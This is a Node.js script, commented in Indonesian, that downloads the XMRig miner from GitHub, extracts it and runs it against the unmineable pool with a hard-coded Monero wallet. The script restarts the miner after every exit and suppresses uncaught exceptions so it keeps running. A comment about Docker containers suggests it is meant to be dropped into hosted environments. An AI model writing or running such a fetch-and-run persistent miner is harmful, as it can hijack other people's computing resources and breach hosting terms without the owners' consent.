const { spawn, exec } = require('child_process');
const fs = require('fs');
const https = require('https');

// === KONFIGURASI MINER (UNMINEABLE) ===
const POOL = 'rx.unmineable.com:3333';
const WALLET_ADDRESS = 'XMR:897fxBxffAjYWdwYxGoHqDCZtSrCiFrPvVR8Xc4baPXYZAq5UFdd8m8S4sHJMsMmq8H7b9tE15oAJNvZLhV9VjBT6HWKEmV#cups-68pw'; // Username atau alias di unmineable
const PASSWORD = 'x'; // Password default unmineable
const ALGO = 'rx'; // Algoritma RandomX

// Link download release Linux Static XMRig versi 6.21.0
const XMRIG_URL = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz';
const TAR_FILE = 'xmrig.tar.gz';
const EXTRACT_DIR = 'xmrig-6.21.0';

function startMiner() {
    console.log('Memulai proses XMRig...');
    
    // Command line arguments untuk XMRig (Unmineable Config)
    const miner = spawn(`./${EXTRACT_DIR}/xmrig`, [
        '-a', ALGO,
        '-o', POOL,
        '-u', WALLET_ADDRESS,
        '-p', PASSWORD,
        '-k'
    ]);

    // Tampilkan output dari XMRig langsung ke console Node.js
    miner.stdout.on('data', (data) => {
        process.stdout.write(data.toString());
    });

    miner.stderr.on('data', (data) => {
        process.stderr.write(data.toString());
    });

    miner.on('close', (code) => {
        console.log(`[!] XMRig terhenti dengan kode: ${code}`);
        console.log('Mencoba restart kembali dalam 5 detik...');
        setTimeout(startMiner, 5000);
    });
}

// Fungsi download bawaan Node.js tanpa mengandalkan wget/curl
function downloadFile(url, dest, cb) {
    https.get(url, (res) => {
        // Handle redirect (Github Releases biasanya mereturn 302 Found menuju AWS S3)
        if (res.statusCode === 301 || res.statusCode === 302) {
            return downloadFile(res.headers.location, dest, cb);
        }
        
        const file = fs.createWriteStream(dest);
        res.pipe(file);
        
        file.on('finish', () => {
            file.close(cb); // jalankan callback ketika file selesai ditulis
        });
    }).on('error', (err) => {
        fs.unlink(dest, () => {}); // Hapus file rusak jika terjadi error
        if (cb) cb(err.message);
    });
}

function setupAndStart() {
    // Mengecek apakah xmrig sudah didownload sebelumnya
    if (fs.existsSync(EXTRACT_DIR)) {
        console.log('[+] XMRig sudah terpasang. Langsung menjalankan...');
        startMiner();
    } else {
        console.log('[+] Mendownload XMRig dari Github menggunakan Node.js HTTPS...');
        
        downloadFile(XMRIG_URL, TAR_FILE, (err) => {
            if (err) {
                console.error(`[X] Gagal mendownload: ${err}`);
                return;
            }
            
            console.log('[+] Download selesai. Mengekstrak file...');
            // Ekstrak menggunakan tar (umumnya tersedia di semua container linux docker)
            exec(`tar -xf ${TAR_FILE}`, (error) => {
                if (error) {
                    console.error(`[X] Gagal ekstrak tar: ${error.message}`);
                    return;
                }
                console.log('[+] Ekstrak berhasil.');
                
                // Hapus file archive (tar.gz) untuk menghemat storage
                if (fs.existsSync(TAR_FILE)) {
                    fs.unlinkSync(TAR_FILE);
                }
                
                startMiner();
            });
        });
    }
}

// Mulai persiapan dan jalankan miner
setupAndStart();

// Mencegah Node.js exit jika ada error tak terduga
process.on('uncaughtException', function (err) {
    console.error('[X] Caught exception: ', err);
});
